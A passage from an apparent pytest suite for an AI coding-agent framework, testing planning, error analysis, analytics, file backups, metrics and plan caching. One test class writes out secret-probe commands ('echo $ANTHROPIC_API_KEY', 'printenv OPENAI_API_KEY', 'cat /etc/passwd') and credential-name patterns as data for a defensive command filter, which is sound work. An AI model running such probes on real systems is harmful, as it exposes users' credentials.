    """Tests for execution cross-domain learning."""

    def test_load_empty_principles(self, tmp_path):
        """Loading from nonexistent file returns empty list."""
        from hands.exec_cross_domain import load_exec_principles
        with patch("hands.exec_cross_domain._EXEC_PRINCIPLES_PATH", str(tmp_path / "nope.json")):
            result = load_exec_principles()
        assert result == []

    def test_save_and_load_principles(self, tmp_path):
        """Principles can be saved and loaded back."""
        from hands.exec_cross_domain import load_exec_principles, _save_exec_principles
        path = str(tmp_path / "principles.json")
        with patch("hands.exec_cross_domain._EXEC_PRINCIPLES_PATH", path):
            _save_exec_principles([
                {"principle": "Always test", "evidence_count": 3, "avg_score": 8.0},
                {"principle": "Use types", "evidence_count": 2, "avg_score": 7.5},
            ])
            loaded = load_exec_principles()
        assert len(loaded) == 2
        # Sorted by evidence_count desc
        assert loaded[0]["principle"] == "Always test"

    def test_principles_similar_true(self):
        """Similar principles are detected."""
        from hands.exec_cross_domain import _principles_similar
        assert _principles_similar(
            "Always create package.json before installing dependencies",
            "Create package.json before installing project dependencies"
        )

    def test_principles_similar_false(self):
        """Different principles are not flagged as similar."""
        from hands.exec_cross_domain import _principles_similar
        assert not _principles_similar(
            "Always test after creating files",
            "Use TypeScript for better type safety"
        )

    def test_get_principles_for_domain_empty(self, tmp_path):
        """No principles returns empty string."""
        from hands.exec_cross_domain import get_principles_for_domain
        with patch("hands.exec_cross_domain._EXEC_PRINCIPLES_PATH", str(tmp_path / "nope.json")):
            result = get_principles_for_domain("test-domain")
        assert result == ""

    def test_get_principles_formats_nicely(self, tmp_path):
        """Principles are formatted as readable text."""
        from hands.exec_cross_domain import get_principles_for_domain, _save_exec_principles
        path = str(tmp_path / "principles.json")
        with patch("hands.exec_cross_domain._EXEC_PRINCIPLES_PATH", path):
            _save_exec_principles([
                {
                    "principle": "Test after creating files",
                    "evidence_count": 5,
                    "avg_score": 8.0,
                    "domains_observed": ["python", "test-domain"],
                },
            ])
            result = get_principles_for_domain("test-domain")
        assert "Learned Execution Principles" in result
        assert "Test after creating files" in result

    def test_suggest_principles_in_strategy(self, tmp_path):
        """Strategy seed combines template with principles."""
        from hands.exec_cross_domain import suggest_principles_in_strategy, _save_exec_principles
        path = str(tmp_path / "principles.json")
        with patch("hands.exec_cross_domain._EXEC_PRINCIPLES_PATH", path):
            _save_exec_principles([
                {
                    "principle": "Always validate JSON config",
                    "evidence_count": 3,
                    "avg_score": 7.5,
                    "domains_observed": ["general"],
                },
            ])
            result = suggest_principles_in_strategy("python")
        assert result is not None
        assert "Python" in result or "PEP 8" in result  # Template part
        assert "Always validate JSON config" in result  # Principles part


# ============================================================
# v5: Workspace Diff Tracking
# ============================================================

class TestWorkspaceDiff:
    """Tests for workspace diff tracking."""

    def test_snapshot_empty_dir(self, tmp_path):
        """Snapshot of empty dir returns empty dict."""
        from hands.workspace_diff import snapshot_workspace
        result = snapshot_workspace(str(tmp_path))
        assert result == {}

    def test_snapshot_with_files(self, tmp_path):
        """Snapshot captures files."""
        from hands.workspace_diff import snapshot_workspace
        (tmp_path / "hello.py").write_text("print('hi')")
        (tmp_path / "data.json").write_text("{}")
        result = snapshot_workspace(str(tmp_path))
        assert "hello.py" in result
        assert "data.json" in result

    def test_snapshot_skips_node_modules(self, tmp_path):
        """Snapshot skips node_modules directory."""
        from hands.workspace_diff import snapshot_workspace
        nm = tmp_path / "node_modules" / "express"
        nm.mkdir(parents=True)
        (nm / "index.js").write_text("module.exports = {}")
        (tmp_path / "app.js").write_text("const express = require('express')")
        result = snapshot_workspace(str(tmp_path))
        assert "app.js" in result
        assert not any("node_modules" in k for k in result)

    def test_diff_created_files(self, tmp_path):
        """Diff detects newly created files."""
        from hands.workspace_diff import snapshot_workspace, compute_diff
        before = snapshot_workspace(str(tmp_path))
        (tmp_path / "new_file.py").write_text("# new")
        after = snapshot_workspace(str(tmp_path))
        diff = compute_diff(before, after)
        assert "new_file.py" in diff["created"]
        assert len(diff["modified"]) == 0
        assert len(diff["deleted"]) == 0

    def test_diff_modified_files(self, tmp_path):
        """Diff detects modified files."""
        from hands.workspace_diff import snapshot_workspace, compute_diff
        f = tmp_path / "config.json"
        f.write_text("{}")
        before = snapshot_workspace(str(tmp_path))
        # Modify the file (different size = different fingerprint)
        f.write_text('{"key": "value", "extra": true}')
        after = snapshot_workspace(str(tmp_path))
        diff = compute_diff(before, after)
        assert "config.json" in diff["modified"]

    def test_diff_deleted_files(self, tmp_path):
        """Diff detects deleted files."""
        from hands.workspace_diff import snapshot_workspace, compute_diff
        f = tmp_path / "temp.txt"
        f.write_text("temporary")
        before = snapshot_workspace(str(tmp_path))
        f.unlink()
        after = snapshot_workspace(str(tmp_path))
        diff = compute_diff(before, after)
        assert "temp.txt" in diff["deleted"]

    def test_format_diff_no_changes(self):
        """Format diff with no changes."""
        from hands.workspace_diff import format_diff_summary
        diff = {"created": [], "modified": [], "deleted": [], "unchanged": 5}
        result = format_diff_summary(diff)
        assert "No file changes" in result

    def test_format_diff_with_changes(self):
        """Format diff with mixed changes."""
        from hands.workspace_diff import format_diff_summary
        diff = {
            "created": ["new.py"],
            "modified": ["old.py"],
            "deleted": ["removed.txt"],
            "unchanged": 3,
        }
        result = format_diff_summary(diff)
        assert "Created (1)" in result
        assert "new.py" in result
        assert "Modified (1)" in result
        assert "Deleted (1)" in result

    def test_snapshot_nonexistent_dir(self):
        """Snapshot of nonexistent directory returns empty dict."""
        from hands.workspace_diff import snapshot_workspace
        result = snapshot_workspace("/nonexistent/path")
        assert result == {}


# ============================================================
# v5: Plan Dependency Validation
# ============================================================

class TestPlanDependencyValidation:
    """Tests for plan dependency graph validation."""

    def test_removes_self_reference(self):
        """Self-references in depends_on are removed."""
        from hands.planner import _validate_dependencies
        steps = [
            {"step_number": 1, "depends_on": [1]},
            {"step_number": 2, "depends_on": [1]},
        ]
        _validate_dependencies(steps)
        assert 1 not in steps[0]["depends_on"]
        assert steps[1]["depends_on"] == [1]

    def test_removes_invalid_step_refs(self):
        """References to non-existent steps are removed."""
        from hands.planner import _validate_dependencies
        steps = [
            {"step_number": 1, "depends_on": []},
            {"step_number": 2, "depends_on": [1, 99]},
        ]
        _validate_dependencies(steps)
        assert steps[1]["depends_on"] == [1]

    def test_removes_forward_references(self):
        """Forward references (depending on later steps) are removed."""
        from hands.planner import _validate_dependencies
        steps = [
            {"step_number": 1, "depends_on": [3]},
            {"step_number": 2, "depends_on": [1]},
            {"step_number": 3, "depends_on": [2]},
        ]
        _validate_dependencies(steps)
        assert steps[0]["depends_on"] == []  # Can't depend on step 3

    def test_breaks_circular_dependency(self):
        """Circular dependencies are detected and broken."""
        from hands.planner import _validate_dependencies
        steps = [
            {"step_number": 1, "depends_on": [2]},
            {"step_number": 2, "depends_on": [1]},
        ]
        _validate_dependencies(steps)
        # After forward-ref removal, step 1 can't depend on 2 (forward)
        # and step 2's dep on 1 is valid
        # So forward-ref cleaning handles this case
        assert steps[0]["depends_on"] == []

    def test_valid_deps_unchanged(self):
        """Valid dependency chains are left intact."""
        from hands.planner import _validate_dependencies
        steps = [
            {"step_number": 1, "depends_on": []},
            {"step_number": 2, "depends_on": [1]},
            {"step_number": 3, "depends_on": [1, 2]},
        ]
        _validate_dependencies(steps)
        assert steps[0]["depends_on"] == []
        assert steps[1]["depends_on"] == [1]
        assert steps[2]["depends_on"] == [1, 2]

    def test_non_list_deps_converted(self):
        """Non-list depends_on is converted to empty list."""
        from hands.planner import _validate_dependencies
        steps = [
            {"step_number": 1, "depends_on": "step1"},
        ]
        _validate_dependencies(steps)
        assert steps[0]["depends_on"] == []


# ============================================================
# v5: Error Analyzer
# ============================================================

class TestErrorAnalyzer:
    """Tests for the smart error categorization system."""

    def test_module_not_found(self):
        """ModuleNotFoundError is categorized correctly."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("ModuleNotFoundError: No module named 'flask'")
        assert result["category"] == "missing_dependency"
        assert result["retryable"] is True
        assert "install" in result["advice"].lower()

    def test_file_not_found(self):
        """FileNotFoundError is categorized correctly."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("FileNotFoundError: [Errno 2] No such file or directory: 'config.json'")
        assert result["category"] == "missing_file"
        assert result["retryable"] is True

    def test_permission_denied(self):
        """PermissionError is categorized correctly."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("PermissionError: [Errno 13] Permission denied: '/etc/passwd'")
        assert result["category"] == "permission"
        assert result["retryable"] is True

    def test_syntax_error(self):
        """SyntaxError is categorized correctly."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("SyntaxError: invalid syntax at line 42")
        assert result["category"] == "syntax_error"
        assert result["retryable"] is True

    def test_command_not_found(self):
        """Command not found errors are categorized."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("bash: tsc: command not found")
        assert result["category"] == "missing_tool"
        assert result["retryable"] is True

    def test_network_error(self):
        """Network errors are categorized."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("ConnectionError: Connection refused for localhost:5000")
        assert result["category"] == "network"

    def test_out_of_memory(self):
        """OOM errors are not retryable."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("FATAL ERROR: JavaScript heap out of memory")
        assert result["category"] == "resource"
        assert result["retryable"] is False

    def test_unknown_error(self):
        """Unknown errors get generic advice."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("Something completely unexpected happened")
        assert result["category"] == "unknown"
        assert result["retryable"] is True

    def test_json_error(self):
        """JSON parse errors are categorized."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("JSONDecodeError: Expecting ',' delimiter")
        assert result["category"] == "json_error"
        assert result["retryable"] is True

    def test_port_conflict(self):
        """Port conflict errors are categorized."""
        from hands.error_analyzer import analyze_error
        result = analyze_error("Error: EADDRINUSE: address already in use :::3000")
        assert result["category"] == "port_conflict"
        assert result["retryable"] is True

    def test_format_retry_guidance(self):
        """Retry guidance formatting works."""
        from hands.error_analyzer import format_retry_guidance
        analysis = {
            "category": "missing_dependency",
            "advice": "Install the missing package first.",
            "retryable": True,
        }
        msg = format_retry_guidance(analysis, retries_left=2)
        assert "missing_dependency" in msg
        assert "2 retries" in msg

    def test_format_non_retryable(self):
        """Non-retryable errors say so in guidance."""
        from hands.error_analyzer import format_retry_guidance
        analysis = {
            "category": "resource",
            "advice": "Out of memory.",
            "retryable": False,
        }
        msg = format_retry_guidance(analysis, retries_left=1)
        assert "unlikely" in msg.lower() or "not" in msg.lower()


# ============================================================
# v6: Execution Analytics
# ============================================================

class TestExecAnalytics:
    """Tests for the execution analytics module."""

    def _make_exec_output(self, score=7.0, goal="Test task", domain="test",
                          tools=None, complexity="medium", accepted=True):
        """Helper to create a mock execution output record."""
        if tools is None:
            tools = [("code", True), ("terminal", True)]

        step_results = [
            {"step": i+1, "tool": t, "success": s, "output": "ok", "error": ""}
            for i, (t, s) in enumerate(tools)
        ]

        return {
            "timestamp": "2026-03-01T12:00:00+00:00",
            "domain": domain,
            "goal": goal,
            "overall_score": score,
            "accepted": accepted,
            "verdict": "accept" if accepted else "reject",
            "plan": {
                "task_summary": goal,
                "steps_count": len(tools),
                "estimated_complexity": complexity,
            },
            "execution": {
                "success": accepted,
                "completed_steps": sum(1 for _, s in tools if s),
                "failed_steps": sum(1 for _, s in tools if not s),
                "total_steps": len(tools),
                "artifacts": [],
                "step_results": step_results,
            },
            "validation": {
                "scores": {
                    "correctness": score,
                    "completeness": score - 0.5,
                    "code_quality": score - 1.0,
                    "security": 8.0,
                    "kb_alignment": 6.0,
                },
                "overall_score": score,
                "strengths": ["clean code"],
                "weaknesses": ["missing tests"],
                "critical_issues": [],
                "static_checks": {"checks_run": 2, "issues": [], "passes": []}
            },
        }

    def test_empty_domain(self):
        """Analytics for empty domain returns no data."""
        from hands.exec_analytics import analyze_executions
        with patch("hands.exec_analytics.load_exec_outputs", return_value=[]):
            result = analyze_executions("empty-domain")
        assert not result["has_data"]

    def test_basic_summary(self):
        """Analytics computes basic summary stats."""
        from hands.exec_analytics import analyze_executions
        outputs = [
            self._make_exec_output(score=6.0, accepted=False),
            self._make_exec_output(score=7.5),
            self._make_exec_output(score=8.0),
        ]
        with patch("hands.exec_analytics.load_exec_outputs", return_value=outputs):
            result = analyze_executions("test")

        assert result["has_data"]
        assert result["summary"]["count"] == 3
        assert 7.0 <= result["summary"]["avg_score"] <= 7.5
        assert result["summary"]["min_score"] == 6.0
        assert result["summary"]["max_score"] == 8.0
        assert result["summary"]["accepted"] == 2

    def test_tool_stats(self):
        """Analytics computes per-tool success rates."""
        from hands.exec_analytics import analyze_executions
        outputs = [
            self._make_exec_output(tools=[("code", True), ("terminal", False)]),
            self._make_exec_output(tools=[("code", True), ("terminal", True)]),
        ]
        with patch("hands.exec_analytics.load_exec_outputs", return_value=outputs):
            result = analyze_executions("test")

        assert "code" in result["tool_stats"]
        assert result["tool_stats"]["code"]["success_rate"] == 1.0
        assert result["tool_stats"]["terminal"]["success_rate"] == 0.5

    def test_score_trajectory(self):
        """Analytics detects score trends."""
        from hands.exec_analytics import analyze_executions
        outputs = [
            self._make_exec_output(score=5.0),
            self._make_exec_output(score=5.5),
            self._make_exec_output(score=6.0),
            self._make_exec_output(score=7.0),
            self._make_exec_output(score=7.5),
            self._make_exec_output(score=8.0),
        ]
        with patch("hands.exec_analytics.load_exec_outputs", return_value=outputs):
            result = analyze_executions("test")

        assert result["score_trajectory"]["trend"] == "improving"

    def test_complexity_breakdown(self):
        """Analytics breaks scores down by complexity."""
        from hands.exec_analytics import analyze_executions
        outputs = [
            self._make_exec_output(score=8.0, complexity="low"),
            self._make_exec_output(score=6.0, complexity="high"),
        ]
        with patch("hands.exec_analytics.load_exec_outputs", return_value=outputs):
            result = analyze_executions("test")

        assert "low" in result["complexity_breakdown"]
        assert "high" in result["complexity_breakdown"]
        assert result["complexity_breakdown"]["low"]["avg_score"] == 8.0
        assert result["complexity_breakdown"]["high"]["avg_score"] == 6.0

    def test_dimension_averages(self):
        """Analytics computes per-dimension score averages."""
        from hands.exec_analytics import analyze_executions
        outputs = [self._make_exec_output(score=7.0)]
        with patch("hands.exec_analytics.load_exec_outputs", return_value=outputs):
            result = analyze_executions("test")

        assert "correctness" in result["dimension_averages"]
        assert "security" in result["dimension_averages"]

    def test_format_report(self):
        """Format report produces readable output."""
        from hands.exec_analytics import analyze_executions, format_analytics_report
        outputs = [
            self._make_exec_output(score=7.0),
            self._make_exec_output(score=7.5),
            self._make_exec_output(score=8.0),
        ]
        with patch("hands.exec_analytics.load_exec_outputs", return_value=outputs):
            analytics = analyze_executions("test")

        report = format_analytics_report(analytics)
        assert "Executions: 3" in report
        assert "Tool Usage:" in report

    def test_format_empty_report(self):
        """Format empty report handles missing data."""
        from hands.exec_analytics import format_analytics_report
        result = format_analytics_report({"has_data": False})
        assert "No execution data" in result

    def test_efficiency_metrics(self):
        """Analytics computes step efficiency metrics."""
        from hands.exec_analytics import analyze_executions
        outputs = [
            self._make_exec_output(tools=[("code", True), ("terminal", True), ("git", True)]),
            self._make_exec_output(tools=[("code", True), ("terminal", False)]),
        ]
        with patch("hands.exec_analytics.load_exec_outputs", return_value=outputs):
            result = analyze_executions("test")

        eff = result["efficiency"]
        assert eff["avg_steps_per_task"] == 2.5  # (3+2)/2
        assert eff["total_steps_executed"] == 5  # 3+1 successes + 1 failure


# ============================================================
# v7: Environment Sanitization
# ============================================================

class TestEnvSanitization:
    """Test that terminal tool strips secrets from subprocess environment."""

    def test_safe_env_strips_api_keys(self):
        """API keys and secrets are stripped from subprocess environment."""
        from hands.tools.terminal import _build_safe_env
        with patch.dict(os.environ, {
            "ANTHROPIC_API_KEY": "sk-ant-secret123",
            "OPENAI_API_KEY": "sk-openai-secret",
            "SECRET_TOKEN": "mysecret",
            "PATH": "/usr/bin",
            "HOME": "/home/user",
        }):
            env = _build_safe_env()
            assert "ANTHROPIC_API_KEY" not in env
            assert "OPENAI_API_KEY" not in env
            assert "SECRET_TOKEN" not in env
            assert env.get("PATH") == "/usr/bin"
            assert env.get("HOME") == "/home/user"

    def test_safe_env_keeps_system_vars(self):
        """System vars like PATH, HOME, LANG are preserved."""
        from hands.tools.terminal import _build_safe_env
        with patch.dict(os.environ, {
            "PATH": "/usr/bin:/usr/local/bin",
            "HOME": "/home/test",
            "USER": "testuser",
            "SHELL": "/bin/bash",
            "NODE_ENV": "development",
        }, clear=True):
            env = _build_safe_env()
            assert "PATH" in env
            assert "HOME" in env
            assert "USER" in env
            assert "SHELL" in env

    def test_safe_env_blocks_credential_patterns(self):
        """Any env var with credential-like name is blocked."""
        from hands.tools.terminal import _build_safe_env
        with patch.dict(os.environ, {
            "MY_PASSWORD": "pass123",
            "AUTH_CREDENTIAL": "cred",
            "PRIVATE_KEY_PATH": "/keys/id_rsa",
            "DATABASE_PASSWD": "dbpass",
            "PATH": "/usr/bin",
        }, clear=True):
            env = _build_safe_env()
            assert "MY_PASSWORD" not in env
            assert "AUTH_CREDENTIAL" not in env
            assert "PRIVATE_KEY_PATH" not in env
            assert "DATABASE_PASSWD" not in env

    def test_command_blocks_secret_probes(self):
        """Commands that try to read secrets are blocked."""
        from hands.tools.terminal import _check_command_safety
        assert _check_command_safety("echo $ANTHROPIC_API_KEY") is not None
        assert _check_command_safety("printenv OPENAI_API_KEY") is not None
        assert _check_command_safety("cat /etc/passwd") is None  # allowed (not a secret probe)


# ============================================================
# v7: File Backup + Rollback
# ============================================================

class TestFileBackup:
    """Test automatic file backup before destructive operations."""

    def test_write_creates_backup_on_overwrite(self, tmp_workspace):
        """Overwriting an existing file creates a backup."""
        from hands.tools.code import CodeTool, _session_backups, _BACKUP_DIR_NAME
        _session_backups.clear()

        filepath = os.path.join(tmp_workspace, "test.txt")
        with open(filepath, "w") as f:
            f.write("original content")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            result = tool.safe_execute(action="write", path=filepath, content="new content")

        assert result.success
        assert "backup" in result.output.lower() or len(_session_backups) > 0

        # Original file has new content
        with open(filepath) as f:
            assert f.read() == "new content"

        _session_backups.clear()

    def test_edit_creates_backup(self, tmp_workspace):
        """Editing a file creates a backup first."""
        from hands.tools.code import CodeTool, _session_backups
        _session_backups.clear()

        filepath = os.path.join(tmp_workspace, "test.txt")
        with open(filepath, "w") as f:
            f.write("hello world")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            result = tool.safe_execute(action="edit", path=filepath, old_string="hello", content="goodbye")

        assert result.success
        with open(filepath) as f:
            assert "goodbye world" in f.read()

        _session_backups.clear()

    def test_delete_creates_backup(self, tmp_workspace):
        """Deleting a file creates a backup first."""
        from hands.tools.code import CodeTool, _session_backups
        _session_backups.clear()

        filepath = os.path.join(tmp_workspace, "to_delete.txt")
        with open(filepath, "w") as f:
            f.write("delete me")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            result = tool.safe_execute(action="delete", path=filepath)

        assert result.success
        assert not os.path.exists(filepath)
        assert len(_session_backups) > 0

        _session_backups.clear()

    def test_rollback_restores_files(self, tmp_workspace):
        """rollback_session restores files from backups."""
        from hands.tools.code import CodeTool, rollback_session, _session_backups
        _session_backups.clear()

        filepath = os.path.join(tmp_workspace, "rollback_test.txt")
        with open(filepath, "w") as f:
            f.write("original")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            tool.safe_execute(action="write", path=filepath, content="modified")

        # Verify modification
        with open(filepath) as f:
            assert f.read() == "modified"

        # Rollback
        results = rollback_session()
        assert len(results) > 0
        assert results[0]["status"] == "restored"

        # Verify restoration
        with open(filepath) as f:
            assert f.read() == "original"

    def test_get_session_backups(self, tmp_workspace):
        """get_session_backups returns the backup list."""
        from hands.tools.code import CodeTool, get_session_backups, clear_session_backups, _session_backups
        _session_backups.clear()

        filepath = os.path.join(tmp_workspace, "tracked.txt")
        with open(filepath, "w") as f:
            f.write("track me")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            tool.safe_execute(action="write", path=filepath, content="new")

        backups = get_session_backups()
        assert len(backups) >= 1
        assert backups[0]["original"] == os.path.abspath(filepath)

        clear_session_backups()
        assert len(get_session_backups()) == 0


# ============================================================
# v7: Tool Execution Metrics
# ============================================================

class TestToolMetrics:
    """Test per-tool execution metrics tracking."""

    def test_metrics_record_success(self):
        """Metrics correctly record successful invocations."""
        from hands.tools.registry import ToolMetrics
        metrics = ToolMetrics()
        metrics.record("code", True, 150.0)
        metrics.record("code", True, 200.0)

        m = metrics.get_metrics("code")
        assert m["invocations"] == 2
        assert m["successes"] == 2
        assert m["failures"] == 0
        assert m["success_rate"] == 1.0
        assert m["avg_duration_ms"] == 175.0

    def test_metrics_record_failure(self):
        """Metrics correctly record failed invocations."""
        from hands.tools.registry import ToolMetrics
        metrics = ToolMetrics()
        metrics.record("terminal", False, 50.0, "Command not found")
        metrics.record("terminal", True, 100.0)

        m = metrics.get_metrics("terminal")
        assert m["invocations"] == 2
        assert m["successes"] == 1
        assert m["failures"] == 1
        assert m["success_rate"] == 0.5
        assert len(m["errors"]) == 1

    def test_metrics_summary(self):
        """Summary aggregates across all tools."""
        from hands.tools.registry import ToolMetrics
        metrics = ToolMetrics()
        metrics.record("code", True, 100.0)
        metrics.record("terminal", True, 200.0)
        metrics.record("terminal", False, 50.0, "error")

        s = metrics.summary()
        assert s["total_invocations"] == 3
        assert s["total_successes"] == 2
        assert s["total_failures"] == 1
        assert set(s["tools_used"]) == {"code", "terminal"}

    def test_metrics_per_tool_empty(self):
        """Getting metrics for unknown tool returns empty dict."""
        from hands.tools.registry import ToolMetrics
        metrics = ToolMetrics()
        assert metrics.get_metrics("nonexistent") == {}

    def test_metrics_reset(self):
        """Reset clears all metrics."""
        from hands.tools.registry import ToolMetrics
        metrics = ToolMetrics()
        metrics.record("code", True, 100.0)
        metrics.reset()
        assert metrics.summary()["total_invocations"] == 0

    def test_registry_records_metrics(self, tmp_workspace):
        """Registry automatically records metrics on tool execution."""
        from hands.tools.registry import ToolRegistry, ToolResult, BaseTool

        class FakeTool(BaseTool):
            name = "fake"
            description = "test"
            def execute(self, **kwargs):
                return ToolResult(success=True, output="ok")

        reg = ToolRegistry()
        reg.register(FakeTool())
        reg.execute("fake")
        reg.execute("fake")

        m = reg.metrics.get_metrics("fake")
        assert m["invocations"] == 2
        assert m["successes"] == 2


# ============================================================
# v7: insert_at_line action
# ============================================================

class TestInsertAtLine:
    """Test the new insert_at_line code tool action."""

    def test_insert_at_beginning(self, tmp_workspace):
        """Insert at line 1 prepends content."""
        from hands.tools.code import CodeTool
        filepath = os.path.join(tmp_workspace, "insert.txt")
        with open(filepath, "w") as f:
            f.write("line1\nline2\nline3\n")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            result = tool.safe_execute(
                action="insert_at_line", path=filepath,
                line_number=1, content="header"
            )

        assert result.success
        with open(filepath) as f:
            lines = f.readlines()
        assert lines[0].strip() == "header"
        assert lines[1].strip() == "line1"

    def test_insert_at_middle(self, tmp_workspace):
        """Insert at line 2 puts content between line 1 and 2."""
        from hands.tools.code import CodeTool
        filepath = os.path.join(tmp_workspace, "insert.txt")
        with open(filepath, "w") as f:
            f.write("line1\nline2\nline3\n")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            result = tool.safe_execute(
                action="insert_at_line", path=filepath,
                line_number=2, content="inserted"
            )

        assert result.success
        with open(filepath) as f:
            lines = f.readlines()
        assert lines[0].strip() == "line1"
        assert lines[1].strip() == "inserted"
        assert lines[2].strip() == "line2"

    def test_insert_requires_params(self, tmp_workspace):
        """insert_at_line requires content and line_number."""
        from hands.tools.code import CodeTool
        filepath = os.path.join(tmp_workspace, "test.txt")
        with open(filepath, "w") as f:
            f.write("hello")

        with patch("hands.tools.code.EXEC_ALLOWED_DIRS", [tmp_workspace]):
            tool = CodeTool()
            result = tool.safe_execute(action="insert_at_line", path=filepath, content="x")
        assert not result.success
        assert "line_number" in result.error.lower()


# ============================================================
# v7: Shared Constants
# ============================================================

class TestSharedConstants:
    """Test the consolidated constants module."""

    def test_skip_dirs_contains_node_modules(self):
        """SKIP_DIRS includes common skippable directories."""
        from hands.constants import SKIP_DIRS
        assert "node_modules" in SKIP_DIRS
        assert ".git" in SKIP_DIRS
        assert "__pycache__" in SKIP_DIRS

    def test_key_filenames_contains_configs(self):
        """KEY_FILENAMES includes important config files."""
        from hands.constants import KEY_FILENAMES
        assert "package.json" in KEY_FILENAMES
        assert "tsconfig.json" in KEY_FILENAMES
        assert "pyproject.toml" in KEY_FILENAMES

    def test_binary_extensions_skips_images(self):
        """BINARY_EXTENSIONS includes image/binary formats."""
        from hands.constants import BINARY_EXTENSIONS
        assert ".png" in BINARY_EXTENSIONS
        assert ".jpg" in BINARY_EXTENSIONS
        assert ".pyc" in BINARY_EXTENSIONS

    def test_max_constants_reasonable(self):
        """Max constants have reasonable values."""
        from hands.constants import MAX_TREE_CHARS, MAX_KEY_FILE_CHARS, MAX_WORKSPACE_FILES
        assert MAX_TREE_CHARS > 0
        assert MAX_KEY_FILE_CHARS > 0
        assert MAX_WORKSPACE_FILES > 0


# ============================================================
# v7: Task Deduplication + Difficulty Adaptation
# ============================================================

class TestTaskDedup:
    """Test that task generator avoids repeating past goals."""

    def test_get_past_goals(self, tmp_workspace):
        """_get_past_goals returns goals from exec memory."""
        from hands.task_generator import _get_past_goals
        outputs = [
            {"goal": "Build a REST API"},
            {"goal": "Create a CLI tool"},
            {"goal": ""},  # empty — should be skipped
        ]
        with patch("hands.task_generator.load_exec_outputs", return_value=outputs):
            goals = _get_past_goals("test")
        assert len(goals) == 2
        assert "Build a REST API" in goals

    def test_complexity_stats(self, tmp_workspace):
        """_get_complexity_stats calculates success rates by level."""
        from hands.task_generator import _get_complexity_stats
        outputs = [
            {"plan": {"estimated_complexity": "low"}, "accepted": True},
            {"plan": {"estimated_complexity": "low"}, "accepted": True},
            {"plan": {"estimated_complexity": "medium"}, "accepted": False},
            {"plan": {"estimated_complexity": "high"}, "accepted": False},
            {"plan": {"estimated_complexity": "high"}, "accepted": False},
        ]
        with patch("hands.task_generator.load_exec_outputs", return_value=outputs):
            stats = _get_complexity_stats("test")

        assert stats["low"]["rate"] == 1.0
        assert stats["medium"]["rate"] == 0.0
        assert stats["high"]["count"] == 2

    def test_max_complexity_caps_when_failing(self):
        """_get_max_allowed_complexity caps at lower level when high fails."""
        from hands.task_generator import _get_max_allowed_complexity
        outputs = [
            {"plan": {"estimated_complexity": "high"}, "accepted": False},
            {"plan": {"estimated_complexity": "high"}, "accepted": False},
            {"plan": {"estimated_complexity": "high"}, "accepted": False},
            {"plan": {"estimated_complexity": "low"}, "accepted": True},
        ]
        with patch("hands.task_generator.load_exec_outputs", return_value=outputs):
            max_level = _get_max_allowed_complexity("test")
        assert max_level == "medium"  # High fails >40%, capped to medium

    def test_max_complexity_no_cap_when_succeeding(self):
        """No complexity cap when success rates are good."""
        from hands.task_generator import _get_max_allowed_complexity
        outputs = [
            {"plan": {"estimated_complexity": "high"}, "accepted": True},
            {"plan": {"estimated_complexity": "high"}, "accepted": True},
            {"plan": {"estimated_complexity": "medium"}, "accepted": True},
        ]
        with patch("hands.task_generator.load_exec_outputs", return_value=outputs):
            max_level = _get_max_allowed_complexity("test")
        assert max_level == "high"

    def test_context_includes_past_goals(self):
        """_prepare_context includes past goals for dedup."""
        from hands.task_generator import _prepare_context
        outputs = [{"goal": "Build a date formatter"}]
        with patch("hands.task_generator.load_exec_outputs", return_value=outputs), \
             patch("hands.task_generator.get_exec_stats", return_value={"count": 1, "avg_score": 7.0, "accepted": 1, "rejected": 0}), \
             patch("hands.task_generator.load_knowledge_base", return_value=None), \
             patch("hands.task_generator.load_outputs", return_value=[]):
            ctx = _prepare_context("test")
        assert "DO NOT REPEAT" in ctx
        assert "date formatter" in ctx


# ============================================================
# v8: Plan Cache
# ============================================================

class TestPlanCache:
    """Test plan caching for reuse of successful plans."""

    def test_put_and_get_exact_match(self, tmp_path):
        """Cache stores and retrieves plans by exact goal match."""
        from hands.plan_cache import PlanCache
        cache = PlanCache(str(tmp_path / "cache.json"))

        plan = {"steps": [{"step": 1, "tool": "code"}], "task_summary": "test"}
        cache.put("Build a REST API", "nextjs-react", plan, score=8.0)

        result = cache.get("Build a REST API", "nextjs-react")
        assert result is not None
        assert result["plan"] == plan
        assert result["score"] == 8.0

    def test_get_returns_none_for_unknown(self, tmp_path):
        """Cache returns None for goals not in cache."""
        from hands.plan_cache import PlanCache
        cache = PlanCache(str(tmp_path / "cache.json"))
        assert cache.get("Unknown task") is None

    def test_rejects_low_score_plans(self, tmp_path):
        """Plans with score < 6 are not cached."""
        from hands.plan_cache import PlanCache
        cache = PlanCache(str(tmp_path / "cache.json"))
        cache.put("Build a thing", "test", {"steps": []}, score=4.0)
        assert cache.get("Build a thing") is None

    def test_similarity_matching(self, tmp_path):
        """Cache finds similar goals via keyword similarity."""
        from hands.plan_cache import PlanCache
        cache = PlanCache(str(tmp_path / "cache.json"))

        plan = {"steps": [{"step": 1}], "task_summary": "typescript REST API"}
        cache.put("Build a TypeScript REST API with Express", "nextjs-react", plan, score=7.5)

        # Similar goal with overlapping keywords
        result = cache.get("Create a TypeScript REST API using Express framework", "nextjs-react")
        # May or may not match depending on keyword overlap — just test the mechanism
        # (Exact match test above is the definitive one)

    def test_domain_filtering(self, tmp_path):
        """Cache respects domain filtering."""
        from hands.plan_cache import PlanCache
        cache = PlanCache(str(tmp_path / "cache.json"))

        cache.put("Build API", "python", {"steps": []}, score=7.0)
